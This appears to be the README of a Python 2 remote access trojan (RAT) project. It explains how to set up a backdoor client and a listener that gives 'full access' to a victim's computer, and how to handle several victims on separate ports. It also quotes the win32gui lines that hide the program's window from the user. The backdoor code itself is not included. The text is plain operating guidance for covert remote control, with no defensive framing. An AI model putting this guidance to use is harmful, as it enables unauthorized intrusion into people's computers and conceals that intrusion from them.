# RAT
## Advanced Client - Server connection, Get full access of Client's computer with backdoor.
### Follow the steps below for implementing Backdoor:
Note: both the codes are in python 2. Some functions like JSON wont work in python 3 properly until & uncless JSON decode error is resolved, so it is recommended to use python 2.
Make sure all the libraries are installed or you can install them by pip install <library name>
All the functions inside code are self explanatory.
the lines: The_program_to_hide = win32gui.GetForegroundWindow() & win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE) is used to hide the window.
Make sure you use correct ip address and port no.

###For Listener.
the IP address must be same as of hosting server ip or the ip of computer in which its being executed.
Do not use reserved port nos.

The if else part in the code is for multiple connectivity.
if you want to connect to mutiple clients then you can switch to them by selecting different values.
for eg: 1 for listerning in port 4444. 2 for 4445 etc.
